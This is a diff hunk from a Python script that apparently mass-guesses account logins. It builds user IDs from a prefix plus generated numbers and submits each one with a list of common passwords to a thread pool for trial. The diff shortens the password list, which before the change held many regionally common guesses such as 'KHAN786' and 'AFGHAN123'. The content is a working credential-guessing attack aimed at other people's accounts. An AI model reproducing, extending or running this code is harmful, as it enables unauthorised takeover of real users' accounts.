@@ -742,7 +742,7 @@ def awm1():
         print('\033[1;32m--------------------------------------------------------------') 
                  for love in user: 
              uid = code+love 
-             pwx = [love,'afghan12345', 'afghan1234', 'KHAN1122', 'KHAN KHAN', 'PAKISTAN', 'KHAN123', 'KHAN1234', 'KHANKHAN', 'AFGHANISTAN', '500600', 'KHAN786', '786786', '1122334455', 'AFGHAN123', '1234512345', 'KABUL1234', '100200', 'AFGHAN', 'AFGHAN1234', 'KABUL123', 'password']
+             pwx = [love,'afghan12345', 'afghan1234']
             manshera.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
